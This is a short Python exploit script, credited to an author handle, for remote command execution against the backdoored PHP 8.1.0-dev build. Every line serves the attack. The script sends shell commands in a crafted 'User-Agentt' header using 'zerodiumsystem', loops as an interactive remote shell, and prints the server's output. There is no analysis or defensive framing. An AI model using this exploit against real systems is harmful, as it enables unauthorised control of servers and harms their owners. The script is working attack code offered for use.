# PHP 8.1.0-dev RCE exploit
# Author: AN0NIT
# Created: June 7 2021
#!/usr/bin/env python3
import requests
from requests.exceptions import ConnectionError

def pwn(url,command):
    url = 'http://'+url
    try:
        session = requests.Session()
        test = session.get(url)
        if test.status_code != 200:
            print(f'\n[-] Issue connecting to server {url}...')
            return
        
        if command is None:
            cmd = input("# ")
        else:
            cmd = command
        if cmd.lower() == 'quit' or cmd.lower() == 'exit':
            exit()
        data = { 
                'User-Agent' : 'Mozilla/5.0 (Windows NT 10.0; rv:78.0) Gecko/20100101 Firefox/78.0',
                'User-Agentt' : f'zerodiumsystem("{cmd}");'  
        }
        response = session.post(url,headers=data)
        print(response.text.split('<!DOCTYPE html>')[0])
        return
    except KeyboardInterrupt:
        print('\n[!] Exiting....')
        exit()
    except ConnectionError:
        print('\n[-] Check if the host is correct....')
        exit()
if __name__ == "__main__":
    url = input("Host IP:")
    while True:
        pwn(url,None)
